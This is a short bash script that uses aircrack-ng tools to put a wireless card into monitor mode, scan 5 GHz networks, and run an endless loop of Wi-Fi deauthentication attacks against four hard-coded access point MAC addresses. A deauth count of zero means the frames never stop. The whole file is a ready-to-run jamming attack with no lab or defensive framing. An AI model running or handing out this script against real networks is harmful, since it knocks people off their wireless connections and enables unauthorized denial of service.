DEAUTH_PACKETS_NUM=0
INTERFACE="wlan0"
INTERFACE_MON="wlan0mon"
SLEEP_INTERVAL="20"
CHANNEL=36

# 2.4 G
MAC1="74:DA:88:C2:C6:4C"
MAC2="68:14:01:3B:5B:8C"

# 5 G
MAC3="74:DA:88:C2:C6:4E"
MAC4="68:14:01:3B:5B:8D"

# Step 1
echo -n ">>> Putting $INTERFACE to monitormode"
airmon-ng start $INTERFACE
sleep 5
echo "...done"


echo -n ">>> Putting $INTERFACE_MON to 5GHz mode on channel $CHANNEL"
iw $INTERFACE_MON set channel $CHANNEL HT40-
sleep 5
echo "...done"

echo -n ">>> Scan  wifi network around $INTERFACE mon"
airodump-ng $INTERFACE_MON --band a
echo "...done"

#Step 2
#airodump-ng -d $MAC1 -c $CHANNEL $INTERFACE_MON --ignore-negative-one 
#airodump-ng -d $MAC2 -c $CHANNEL $INTERFACE_MON --ignore-negative-one
airodump-ng -d $MAC3 -c $CHANNEL $INTERFACE_MON
airodump-ng -d $MAC4 -c $CHANNEL $INTERFACE_MON


#Step 3
while [ 1 ]
do
	# 2.4 GHz
	#aireplay-ng -o $DEAUTH_PACKETS_NUM -a $MAC1 $INTERFACE --deauth $DEAUTH_PACKETS_NUM &
	#sleep $SLEEP_INTERVAL
	#aireplay-ng -o $DEAUTH_PACKETS_NUM -a $MAC2 $INTERFACE --deauth $DEAUTH_PACKETS_NUM &
      	#sleep $SLEEP_INTERVAL

	# 5 GHz
	aireplay-ng -o $DEAUTH_PACKETS_NUM -a $MAC3 $INTERFACE_MON --deauth $DEAUTH_PACKETS_NUM &
	#sleep $SLEEP_INTERVAL
	aireplay-ng -o $DEAUTH_PACKETS_NUM -a $MAC4 $INTERFACE_MON --deauth $DEAUTH_PACKETS_NUM &
      	sleep $SLEEP_INTERVAL
done

